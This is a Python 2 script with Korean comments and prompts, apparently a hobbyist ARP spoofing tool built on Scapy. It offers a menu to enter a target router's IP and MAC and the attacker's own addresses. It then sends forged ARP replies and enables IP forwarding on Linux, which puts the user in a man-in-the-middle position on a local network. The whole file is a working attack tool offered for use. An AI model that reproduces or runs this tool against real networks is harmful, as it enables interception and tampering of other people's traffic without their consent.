#-*- coding: utf-8 -*-
#
# import 부분
#
##################################
from scapy.all import *
import os
import sys
import time
##################################

#
# global 변수 지정
#
##################################

global routerIP
global routerMAC
global myIP
global myMAC

def nowArp():
	os.system('clear')
	print "LAN 상의 arp 상태"
	os.system('arp -a')
	print " "
	print " "
	print "현재 이더넷의 IP, MAC 주소"
	os.system('ifconfig -a')

def nowSet():
	global routerIP
	global routerMAC
	global myIP
	global myMAC
	os.system('clear')
	print "라우터 IP 	: ",routerIP
	print "라우터 MAC	: ",routerMAC
	print "내 IP 		: ",myIP
	print "내 MAC		: ",myMAC
	print " "
	print "아무키나 누르면 계속합니다..."
	raw_input()
	main()

def setRouter(input):
	global routerIP
	global routerMAC
	os.system('clear')
	nowArp()
	if input == '2':
		print "공격받을 라우터의 IP를 입력해주세요"
		routerIP = raw_input()

	elif input == '3':
		print "공격받을 라우터의 MAC을 입력해주세요"
		routerMAC = raw_input()

	else:
		print "비정상적인 접근입니다"
		os.system('exit')
	main()

def setMy(input):
	global myIP
	global myMAC
	os.system('clear')
	nowArp()
	if input == '4':
		print "당신의 IP를 입력해주세요"
		myIP = raw_input()

	elif input == '5':
		print "당신의 MAC을 입력해주세요"
		myMAC = raw_input()

	else:
		print "비정상적인 접근입니다"
                os.system('exit')
	main()

def trySpf():
	global routerIP
	global routerMAC
	global myIP
	global myMAC
	os.system('clear')
	tryArp = ARP()
	tryArp.hwsrc	= myMAC			#출발지 맥 주소
	tryArp.psrc	= myIP			#출발지 IP 주소
	tryArp.pdst	= routerIP		#목적지 IP 주소
	print "arp spoofing을 시작합니다"
        print "조작 대상  IP : ",routerIP
	print "조작 되는  IP : ",myIP
	print "조작 되는 MAC : ",myMAC
	print "."
	send(tryArp)
	time.sleep(1)				#오래걸리는 척
	print "."
	send(tryArp)
	time.sleep(1)
	print "."
	send(tryArp)
	time.sleep(1)

	print "arp spoofing완료. IP Forwarding 설정을 위해 본PC의 운영체제를 확인합니다"
	print sys.platform," 감지"
	
	if sys.platform.startswith('linux'):
		os.system('sysctl -w net.ipv4.ip_forward=1')
		print "IP Fowarding 설정 완료"
		print "아무키나 입력하면 계속합니다..."
		raw_input()
		main()
	
	elif sys.platform.startswith('win'):
		print "Windows 운영체제는 직접 설정해주세요" 
		print "아무키나 입력하면 계속합니다..."
		raw_input()
		main()
	else:
		print "운영체제가 확인되지 않습니다. 수동으로 IP Forwarding을 설정해주세요"
		print "아무키나 입력하면 계속합니다..."
                raw_input()
                main()

def main():
	global routerIP
	global routerMAC
	global myIP
	global myMAC

	os.system('clear')
        print "###############################"
        print "#"
        print "# arp 주작에 오신걸 환영합니다"
        print "#"
        print "# 1. 현재 arp, 이더넷 확인"
        print "# 2. 공격받을 라우터의 IP 지정"
        print "# 3. 공격받을 라우터의 MAC지정"
        print "# 4. 내 IP 지정"
        print "# 5. 내 MAC지정"
        print "# 6. 현재 설정된 상태 확인"
       	print "# 7. arp spoofing 시작"
	print "# 0. 나가기"
	print "#"
        print "###############################"

        input = raw_input()
        if input == '0':
		os.system('exit')
	elif input == '1':
                nowArp()
		print "아무키나 누르면 계속합니다..."
	        raw_input("")
      		main()
	elif input == '2' or input == '3':
		setRouter(input)
	elif input == '4' or input == '5':
		setMy(input)
	elif input == '6':
		nowSet()
	elif input == '7':
		trySpf()
	else:
		main()

if __name__ == "__main__":
	main()
